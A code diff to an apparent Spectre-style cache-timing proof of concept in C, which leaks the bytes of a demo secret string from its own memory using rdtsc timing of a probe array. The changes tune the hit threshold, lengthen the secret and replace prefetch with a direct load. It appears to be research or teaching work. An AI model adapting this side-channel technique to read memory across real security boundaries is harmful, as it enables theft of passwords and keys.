@@ -13,13 +13,14 @@
 #define ARRAY_SIZE 256 // number of possible byte values
 #define PAGE_SIZE 4096 // elements in probe_array should be PAGE_SIZE bytes apart to ensure they occupy different cache lines
 #define DELTA 1024
-#define CACHE_HIT_PREFETCH_THRESHOLD 150
+//#define CACHE_HIT_PREFETCH_THRESHOLD 150
+#define CACHE_HIT_PREFETCH_THRESHOLD 175
 #define NUM_ITER 50 // number of times to time each character in secret
 
 int buffer_size = 10;
 uint8_t buffer[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
-//char* secret = "All games consist of three parts: an introductory phase in which Sam begins in one room of his house, looking for his cape (or equipment that makes him courageous enough to face Darkness in the first game) and entering an imaginary world, the actual journey he undertakes in that world, and a concluding cinematic that ends the story. The world changes every time a new game is started (even though the main and side objectives stay the same). The games consist of Pajama Sam finding objects in the world and using them somewhere else. A cutscene is usually played if the right item is used. Each game has a save feature. In addition to a main storyline, each individual game has a separate objective to collect objects scattered around Sam's world.\nIn the first game, the player had no control over what scenarios would be encountered in one playthrough. In the sequel, the player can choose from several combinations of scenarios to play with, and in the last two games, he/she is given complete control on what kind of scenarios are encountered for each step towards resolving the main conflict.";
-char* secret = "Pajama Sam";
+char* secret = "All games consist of three parts: an introductory phase in which Sam begins in one room of his house, looking for his cape (or equipment that makes him courageous enough to face Darkness in the first game) and entering an imaginary world, the actual journey he undertakes in that world, and a concluding cinematic that ends the story. The world changes every time a new game is started (even though the main and side objectives stay the same). The games consist of Pajama Sam finding objects in the world and using them somewhere else. A cutscene is usually played if the right item is used. Each game has a save feature. In addition to a main storyline, each individual game has a separate objective to collect objects scattered around Sam's world.\nIn the first game, the player had no control over what scenarios would be encountered in one playthrough. In the sequel, the player can choose from several combinations of scenarios to play with, and in the last two games, he/she is given complete control on what kind of scenarios are encountered for each step towards resolving the main conflict.";
+//char* secret = "Pajama Sam";
 
 uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE];
 uint8_t temp = 0;
@@ -57,7 +58,8 @@ int main(int argc, char* argv[]) {
 	
 	register uint64_t start, total_cycles; // cycle timestamps
 	uint8_t* addr; // pointer to a byte		
-	size_t secret_idx;
+	unsigned int junk = 0; // temp variable
+    size_t secret_idx;
 	uint8_t buffer_item = 0;
 	uint8_t guess = 0;
 	unsigned int scores[256];
@@ -96,10 +98,11 @@ int main(int argc, char* argv[]) {
 			for(int i=0; i<ARRAY_SIZE; i++) {
 				addr = &probe_array[i * PAGE_SIZE + DELTA];
 				start = rdtsc();
-				_mm_prefetch(addr, 2);
+				//_mm_prefetch(addr, 2); // interesting ; does not work on my reseach computer
+                junk = *addr;
 				total_cycles = rdtsc() - start;
 				if(total_cycles < CACHE_HIT_PREFETCH_THRESHOLD) guess = i;
-				//printf("%i: %i\n", i, (int)total_cycles);
+				//printf("%i: %i cycles\n", i, (int)total_cycles);
 			}
 			// increment the score for this byte
 			scores[guess]++;
@@ -117,8 +120,9 @@ int main(int argc, char* argv[]) {
 		}
 
 		//printf("%c", improved_guess);
-		printf("Guess = %c (%-3i) (score %-2i)\n", improved_guess, improved_guess, scores[improved_guess]);
-		//printf("%-16s %-16s\n", "byte", "score");
+		//irintf("Guess = %c (%-3i) (score %-2i)\n", improved_guess, improved_guess, scores[improved_guess]);
+		printf("%c", improved_guess);
+        //printf("%-16s %-16s\n", "byte", "score");
 		//for(int s=0; s<256; s++) {
 		//	printf("%-16i %-16i\n", s, scores[s]);
 		//}
